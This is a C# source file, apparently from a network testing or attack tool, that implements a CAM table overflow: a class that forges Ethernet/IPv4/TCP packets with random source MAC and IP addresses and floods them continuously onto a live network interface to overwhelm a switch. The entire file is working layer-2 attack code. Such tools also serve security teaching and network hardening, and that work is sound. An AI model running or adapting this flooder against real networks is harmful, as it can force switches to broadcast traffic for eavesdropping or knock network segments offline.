using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using PcapDotNet.Base;
using PcapDotNet.Core;
using PcapDotNet.Packets;
using PcapDotNet.Packets.Ethernet;
using PcapDotNet.Packets.IpV4;
using PcapDotNet.Packets.Transport;

namespace DipW.Classes.Manipulators.Senders
{
    class CAMOverflowSender
    {
        private LivePacketDevice _device;
        private BackgroundWorker _bgWorker;
        private Random _random;

        private EthernetLayer _ethernetLayer;
        private IpV4Layer _ipV4Layer;
        private TcpLayer _tcpLayer;
        private PayloadLayer _payloadLayer;

        private List<Tuple<MacAddress, IpV4Address>> _entries;
        private long _timePerRun = 60000; //1min

        public LivePacketDevice Device
        {
            get { return _device; }
            set { _device = value; }
        }

        public int EntryCount
        {
            get { return _entries.Count; }
            set
            {
                _entries = new List<Tuple<MacAddress, IpV4Address>>();
                for (int i = 0; i < value; i++)
                {                   
                    _entries.Add(
                        new Tuple<MacAddress, IpV4Address>(
                            new MacAddress((UInt48)_random.Next()),
                            new IpV4Address((uint)_random.Next())));
                };
            }
        }

        public BackgroundWorker BgWorker
        {
            get { return _bgWorker; }
        }

        //constructors
        public CAMOverflowSender(LivePacketDevice device, int entryCount)
        {
            _device = device;        
            _entries = new List<Tuple<MacAddress, IpV4Address>>();
            _random = new Random();
            EntryCount = entryCount;
 
            _bgWorker = new BackgroundWorker();
            _bgWorker.WorkerSupportsCancellation = true;
            _bgWorker.DoWork += new DoWorkEventHandler(DoWork);
            InitializePackets();
        }

        private void InitializePackets()
        {
            //Fill with dummy data
            _ethernetLayer =
                new EthernetLayer
                {
                    Source = new MacAddress("01:01:01:01:01:01"),
                    Destination = new MacAddress("02:02:02:02:02:02"),
                    EtherType = EthernetType.None, // Will be filled automatically.
                };

            _ipV4Layer =
                new IpV4Layer
                {
                    Source = new IpV4Address("1.2.3.4"),
                    CurrentDestination = new IpV4Address("11.22.33.44"),
                    Fragmentation = IpV4Fragmentation.None,
                    HeaderChecksum = null, // Will be filled automatically.
                    Identification = 123,
                    Options = IpV4Options.None,
                    Protocol = null, // Will be filled automatically.
                    Ttl = 100,
                    TypeOfService = 0,
                };

            _tcpLayer =
                new TcpLayer
                {
                    SourcePort = 4050,
                    DestinationPort = 25,
                    Checksum = null, // Will be filled automatically.
                    SequenceNumber = 100,
                    AcknowledgmentNumber = 50,
                    ControlBits = TcpControlBits.Acknowledgment,
                    Window = 100,
                    UrgentPointer = 0,
                    Options = TcpOptions.None,
                };

            _payloadLayer =
                new PayloadLayer
                {
                    Data = new Datagram(Encoding.ASCII.GetBytes("CAM Flooding Packet")),
                };
        }

        //methods
        public void FloodSwitch()
        {
            if (!_bgWorker.IsBusy)
            {
                _bgWorker.RunWorkerAsync();
            }
            else
                throw new Exception("Flooding is still ongoing, cannot start another scan!");
        }

        private void DoWork(object sender, DoWorkEventArgs e)
        {  
            using (PacketCommunicator communicator = _device.Open())
            {             
                while (true)
                {
                    var watch = Stopwatch.StartNew();
                    foreach (var senderEntry in _entries)
                    {
                        communicator.SendPacket(GeneratePacket(senderEntry));
                    }
                    watch.Stop();
                    var timeToSleep = _timePerRun - watch.ElapsedMilliseconds;
                    if (timeToSleep < 0)
                        throw new Exception("Cannot send the requested amount of packets in " + _timePerRun + " milliseconds");
                    else
                    {
                        for (int i = 0; i < 100; i++)
                        {
                            if (_bgWorker.CancellationPending)
                                return;
                            Thread.Sleep((int)timeToSleep / 100);
                        }
                    }
                }
            }
        }

        private Packet GeneratePacket(Tuple<MacAddress, IpV4Address> senderEntry)
        {
            _ethernetLayer.Source = senderEntry.Item1;
            _ethernetLayer.Destination = new MacAddress((UInt48)_random.Next());
            _ipV4Layer.Source = senderEntry.Item2;
            _ipV4Layer.CurrentDestination = new IpV4Address((uint)_random.Next());
            PacketBuilder builder = new PacketBuilder(_ethernetLayer, _ipV4Layer, _tcpLayer, _payloadLayer);
            return builder.Build(DateTime.Now);
        }
    }
}
